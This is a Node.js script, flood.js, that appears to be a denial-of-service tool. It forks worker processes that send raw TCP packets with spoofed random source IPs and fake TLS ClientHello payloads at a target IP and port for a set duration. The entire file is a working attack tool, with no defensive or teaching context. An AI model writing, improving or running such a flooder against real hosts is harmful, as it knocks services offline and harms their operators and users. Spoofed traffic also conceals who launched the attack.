const raw = require('raw-socket');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

const [,, targetIP, targetPort, threads, duration] = process.argv;

if (!targetIP || !targetPort || !threads || !duration) {
    console.log('Usage: node flood.js <ip> <port> <threads> <duration>');
    process.exit(1);
}

function checksum(buf) {
    let sum = 0;
    for (let i = 0; i < buf.length; i += 2) {
        sum += buf.readUInt16BE(i);
        if (sum > 0xffff) sum -= 0xffff;
    }
    return (~sum) & 0xffff;
}

function ip2buffer(ip) {
    return Buffer.from(ip.split('.').map(e => parseInt(e)));
}

function randomIP() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 254) + 1).join('.');
}

function buildTLSClientHello() {
    const tls = Buffer.from([
        0x16, 0x03, 0x01, 0x00, 0xdc, 
        0x01, 0x00, 0x00, 0xd8,       
        0x03, 0x03,                   
        ...crypto.randomBytes(32),    
        0x00,                         
        0x00, 0x20,                   
        0x13, 0x01, 0x13, 0x02, 0x13, 0x03, 0xc0, 0x2c,
        0xc0, 0x30, 0x00, 0x9f, 0xcc, 0xa9, 0xcc, 0xa8,
        0xcc, 0xaa, 0xc0, 0x2b, 0xc0, 0x2f, 0x00, 0x9e,
        0x00, 0x6b, 0x00, 0x6a, 0x00, 0x39, 0x00, 0x33,
        0x00, 0x67, 0x00, 0x40,       
        0x01, 0x00,                   
        0x00, 0x81,                   
        ...crypto.randomBytes(100)
    ]);
    return tls;
}

function buildTCPPacket(srcIP, dstIP, srcPort, dstPort, flags, payload) {
    const ipHeader = Buffer.alloc(20);
    const tcpHeader = Buffer.alloc(20);
    const totalLength = ipHeader.length + tcpHeader.length + (payload ? payload.length : 0);

    ipHeader[0] = 0x45;
    ipHeader[1] = 0x00;
    ipHeader.writeUInt16BE(totalLength, 2);
    ipHeader.writeUInt16BE(crypto.randomBytes(2).readUInt16BE(0), 4);
    ipHeader.writeUInt16BE(0x4000, 6);
    ipHeader[8] = 64;
    ipHeader[9] = 6;
    ip2buffer(srcIP).copy(ipHeader, 12);
    ip2buffer(dstIP).copy(ipHeader, 16);
    ipHeader.writeUInt16BE(checksum(ipHeader), 10);

    tcpHeader.writeUInt16BE(srcPort, 0);
    tcpHeader.writeUInt16BE(dstPort, 2);
    tcpHeader.writeUInt32BE(crypto.randomBytes(4).readUInt32BE(0), 4);
    tcpHeader.writeUInt32BE(0, 8);
    tcpHeader[12] = (5 << 4);
    tcpHeader[13] = flags;
    tcpHeader.writeUInt16BE(0x7110, 14);
    tcpHeader.writeUInt16BE(0, 16);
    tcpHeader.writeUInt16BE(0, 18);

    const pseudoHeader = Buffer.concat([
        ip2buffer(srcIP),
        ip2buffer(dstIP),
        Buffer.from([0x00, 0x06]),
        Buffer.alloc(2, tcpHeader.length + (payload ? payload.length : 0)),
        tcpHeader,
        payload || Buffer.alloc(0)
    ]);

    const tcpChecksum = checksum(pseudoHeader);
    tcpHeader.writeUInt16BE(tcpChecksum, 16);

    return Buffer.concat([ipHeader, tcpHeader, payload || Buffer.alloc(0)]);
}

function flood() {
    const socket = raw.createSocket({ protocol: raw.Protocol.None });
    const end = Date.now() + (Number(duration) * 1000);

    function send() {
        if (Date.now() > end) process.exit();

        const srcIP = randomIP();
        const srcPort = Math.floor(Math.random() * 60000) + 1024;
        const tlsHello = buildTLSClientHello();
        const packet = buildTCPPacket(srcIP, targetIP, srcPort, targetPort, 0x18, tlsHello); 

        socket.send(packet, 0, packet.length, targetIP, function (err) {
            if (err) console.error('Error:', err);
        });

        const ackOnly = buildTCPPacket(srcIP, targetIP, srcPort, targetPort, 0x10); 
        socket.send(ackOnly, 0, ackOnly.length, targetIP, function (err) {
            if (err) console.error('Error:', err);
        });
    }

    setInterval(send, 0);
}

if (cluster.isMaster) {
    console.log(`Flood to ${targetIP}:${targetPort} with ${threads} threads...`);
    for (let i = 0; i < threads; i++) cluster.fork();
} else {
    flood();
}
